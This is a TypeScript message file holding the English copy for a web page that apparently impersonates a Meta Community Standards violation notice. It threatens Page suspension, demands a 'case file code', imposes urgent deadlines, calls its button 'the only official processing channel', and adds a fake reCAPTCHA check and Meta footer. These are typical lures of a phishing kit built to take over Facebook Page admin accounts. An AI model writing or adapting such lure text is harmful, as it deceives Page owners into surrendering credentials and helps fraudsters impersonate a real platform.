export const enMessages = {
  meta: {
    title: 'Notice: Video may violate Community Standards',
    description:
      'Your Page has a video that may violate Community Standards. This may be due to unsafe content, copyright, misleading information, or spam. Review the video, edit or remove violating segments, align with Community Standards, and submit a review request with an accurate description.',
    ogTitle: 'Community Standards — Video review',
  },
  main: {
    title: 'Your Page is under enhanced control',
    p1: 'The system has detected that at least one video on your Page shows signs of a serious violation of Community Standards. This result was determined through automated review combined with recorded report data.',
    p2: 'Based on the current risk level, your Page has been placed under enhanced control. Some core features may already be restricted or may continue to face additional control measures without prior notice.',
    ticketLine: 'Required case file code:',
    ticketHint: 'This code is the unique identifier of the review session. Requests without a valid code may be rejected automatically.',
    summaryTitle: 'Potential consequences if not handled in time',
    summaryBody:
      '- Reduced or fully suspended content distribution\n- Temporary lock on posting, editing, or interaction features\n- Suspension of Page access if violations are confirmed\n- Long-term restrictions applied to related admin accounts',
    ctaHeadline: 'IMMEDIATE ACTION REQUIRED',
    ctaSubline:
      '*System status:* Awaiting verification from the administrator before a final conclusion is made.\n\nYou must complete the review request via the button below to provide matching information. This is the only official processing channel recognized by the system.',
    ctaButton: 'Submit review request',
    ctaFootnote:
      'Failure to respond within the required timeframe may cause the system to:\n- Automatically finalize the conclusion based on existing data\n- Apply higher-level restrictions\n- Record a violation permanently in the Page history\n\nStandard processing time: **24–72 business hours** (*may be longer if advanced verification is required*).\n\nValid requests are prioritized. Cases without response may be processed without additional notice.',
    navHelp: 'Help Center',
    navPrivacy: 'Privacy Policy',
    navTerms: 'Terms of Service',
    navCommunity: 'Community Standards',
    navMeta: 'Meta © {year}',
  },
  captcha: {
    notRobot: "I'm not a robot",
    p1: 'This helps us combat harmful conduct, detect and prevent spam, and maintain the integrity of our Products.',
    p2: "We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.",
    p3: 'reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalised advertising.',
    privacyTerms: 'Privacy - Terms',
  },
  i18nSwitcher: 'Language',
}

export type MessageTree = typeof enMessages
